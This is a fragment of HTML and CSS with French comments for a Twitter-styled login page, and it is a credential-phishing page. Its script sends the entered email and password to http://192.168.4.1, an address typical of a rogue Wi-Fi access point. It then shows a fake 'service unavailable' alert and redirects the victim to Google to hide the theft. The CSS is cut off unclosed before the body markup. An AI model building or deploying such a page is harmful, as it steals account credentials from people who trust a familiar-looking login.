.form-control {

    padding: 15px;
    margin-bottom: 20px;
    border: 1px solid #ced4da;
    border-radius: 30px; /* Plus arrondi */
    box-sizing: border-box;
}

.form-control:focus {
    border-color: #1da1f2; /* Bleu Twitter pour le focus */
    outline: none;
}

.btn {
    width: 100%;
    padding: 15px;
    border: none;
    border-radius: 30px;
    background-color: black; 
    color: white;
    cursor: pointer;
    transition: background-color 0.3s;
    font-weight: bold; /* Texte en gras */

<body>
    <div class="login-form">
        <div class="login-image"></div>
        <input type="email" id="email" class="form-control" placeholder="Email">
        <input type="password" id="password" class="form-control" placeholder="Password">
        <button onclick="sendCredentials()" class="btn">Connexion</button>
    </div>

    <script>
        function sendCredentials() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
			alert("Service indisponible.");
            window.location.href = "https://www.google.com";
        }

        function getFile(url) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.send();
        }
    </script>
</body>
